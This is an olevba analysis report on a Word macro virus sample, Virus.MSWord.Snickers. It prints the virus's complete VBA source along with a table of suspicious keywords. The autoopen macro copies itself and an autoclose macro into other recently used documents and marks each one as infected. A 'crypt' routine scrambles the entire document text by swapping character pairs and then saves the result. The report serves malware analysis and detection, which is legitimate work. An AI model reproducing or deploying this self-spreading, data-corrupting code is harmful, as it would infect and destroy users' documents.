olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Snickers-e9920e26c8e8af5fab4cda74a2f1b07593346fee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Snickers-e9920e26c8e8af5fab4cda74a2f1b07593346fee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Snickers-e9920e26c8e8af5fab4cda74a2f1b07593346fee - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim a_
Dim b$
WordBasic.ScreenUpdating
WordBasic.DisableAutoMacros
a$ = WordBasic.[FileName$]()
For a_ = 1 To WordBasic.CountFiles()
If WordBasic.[Files$](WordBasic.[FileName$](a_)) <> "" Then
WordBasic.FileList a_
b$ = WordBasic.[FileName$]()
If a$ <> b$ Then
If WordBasic.[GetDocumentVar$]("snickers") = "" Then
WordBasic.MacroCopy a$ + ":autoopen", b$ + ":"
WordBasic.MacroCopy a$ + ":autoclose", b$ + ":"
crypt
WordBasic.SetDocumentVar "snickers", "mmmhh"
WordBasic.FileSaveAs Format:=1
End If
WordBasic.FileClose
End If
End If
Next
crypt
WordBasic.DisableAutoMacros 0
End Sub
Private Sub crypt()
Dim a$
Dim a_
Dim b$
WordBasic.EditSelectAll
a$ = WordBasic.[Selection$]()
On Error Resume Next
For a_ = 1 To Len(a$) Step 2
b$ = b$ + Mid(a$, a_ + 1, 1)
b$ = b$ + Mid(a$, a_, 1)
Next
WordBasic.Insert b$
WordBasic.WW6_EditClear -1
WordBasic.StartOfDocument
End Sub
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Snickers-e9920e26c8e8af5fab4cda74a2f1b07593346fee - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.ScreenUpdating
WordBasic.Call "autoopen.crypt"
WordBasic.FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

